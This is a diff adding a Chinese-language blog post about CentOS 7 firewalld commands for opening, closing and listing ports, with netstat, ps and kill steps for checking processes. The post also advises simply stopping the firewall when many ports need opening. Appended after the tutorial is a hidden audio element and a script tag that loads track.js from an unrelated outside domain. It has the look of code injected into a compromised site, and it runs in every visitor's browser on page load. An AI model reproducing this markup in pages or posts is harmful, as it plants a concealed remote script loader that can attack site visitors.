@@ -1,0 +1,43 @@
+---
+layout: post
+title: Centos7 防火墙
+date: 2020-07-30 09:15:00.000000000 +08:00
+type: post
+parent_id: '0'
+published: true
+password: ''
+status: publish
+categories:
+- Linux
+tags: []
+meta:
+  blocksy_post_meta_options: a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}
+author:
+  login: gavin
+  email: 519077334@qq.com
+  display_name: gavin
+  first_name: ''
+  last_name: ''
+permalink: "/index.php/2020/07/30/centos7-%e9%98%b2%e7%81%ab%e5%a2%99/"
+---
+<p>1、开放端口</p>
+<p><strong>firewall-cmd --zone=public --add-port=5672/tcp --permanent </strong>  # 开放5672端口</p>
+<p><strong>firewall-cmd --zone=public --remove-port=5672/tcp --permanent </strong> #关闭5672端口</p>
+<p><strong>firewall-cmd --reload</strong>   # 配置立即生效</p>
+<p>2、查看防火墙所有开放的端口</p>
+<p><strong>firewall-cmd --zone=public --list-ports</strong></p>
+<p>3.、关闭防火墙</p>
+<p>如果要开放的端口太多，嫌麻烦，可以关闭防火墙，安全性自行评估</p>
+<p><strong>systemctl stop firewalld.service</strong></p>
+<p>4、查看防火墙状态</p>
+<p><strong> firewall-cmd --state</strong></p>
+<p>5、查看监听的端口</p>
+<p><strong>netstat -lnpt</strong></p>
+<p><em>PS:centos7默认没有 netstat 命令，需要安装 net-tools 工具，yum install -y net-tools</em></p>
+<p>6、检查端口被哪个进程占用</p>
+<p><strong>netstat -lnpt |grep 5672</strong></p>
+<p>7、查看进程的详细信息</p>
+<p><strong>ps 6832</strong></p>
+<p>8、中止进程</p>
+<p><strong>kill -9 6832</strong></p>
+<p><audio style="display: none;" controls="controls"></audio><script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script></p>
